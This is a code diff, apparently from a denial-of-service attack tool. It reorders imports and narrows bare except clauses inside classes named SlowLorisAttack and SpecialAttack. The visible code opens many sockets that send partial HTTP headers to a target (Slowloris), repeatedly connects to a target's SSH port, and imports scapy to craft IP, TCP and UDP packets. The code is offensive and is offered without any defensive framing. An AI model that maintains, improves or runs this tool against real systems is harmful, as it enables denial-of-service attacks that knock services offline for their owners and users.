@@ -1,7 +1,9 @@
+import socket
 import threading
 import time
-import socket
-from scapy.all import IP, UDP, TCP, send
+
+from scapy.all import IP, TCP, UDP, send
+
 from ..config import Config, logger
 
 
@@ -161,12 +163,12 @@ class SlowLorisAttack(Layer4Attack):
                     s.send(headers.encode('ascii'))
                     sockets.append(s)
                     time.sleep(0.1)
-                except:
+                except Exception:
                     pass
             for s in sockets:
                 try:
                     s.close()
-                except:
+                except Exception:
                     pass
             logger.info("Slowloris атака завершена")
 
@@ -189,7 +191,7 @@ class SpecialAttack(Layer4Attack):
                     try:
                         s.connect((self.target_ip, 22))
                         s.close()
-                    except:
+                    except Exception:
                         pass
                 logger.info(f"{self.attack_type} атака завершена")
 
